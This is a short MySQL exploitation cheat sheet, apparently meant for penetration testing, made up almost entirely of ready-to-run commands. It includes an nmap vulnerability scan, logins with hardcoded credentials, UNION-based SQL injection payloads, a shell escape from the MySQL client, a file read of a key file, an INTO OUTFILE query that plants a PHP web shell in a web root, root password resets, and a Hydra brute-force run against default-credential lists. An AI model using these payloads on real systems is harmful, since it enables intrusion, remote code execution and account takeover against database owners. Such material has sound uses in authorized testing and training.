# MySQL Exploitation and Enumeration Cheatsheet

## Nmap Script

```bash
nmap -p 3306 --script=mysql-vuln* 192.168.1.1
```

## MySQL Connection

```bash
mysql -u john -h 192.168.1.1 -P 3306 -p -A
mysql -u root -p'toor' -h 192.168.1.1 -P 3306
mysql -h test.local -u root@192.168.1.1
```

## MySQL Commands

```sql
-- List databases
show databases;

-- Use a specific database
use <database>;
connect <database>;

-- Show tables and columns
describe <table_name>;
show tables;
show columns from <table>;

-- Get version and user information
select version();   -- version
select @@version(); -- version
select user();      -- user
select database();  -- database name

-- Get a shell with the MySQL client user
\! sh

-- Basic MySQL Injection
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables;
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>";

-- Read & Write (requires FILE privilege)
select load_file('/var/lib/mysql-files/key.txt'); -- Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php';

-- Change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

## Brute Force with Hydra

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://192.168.1.1
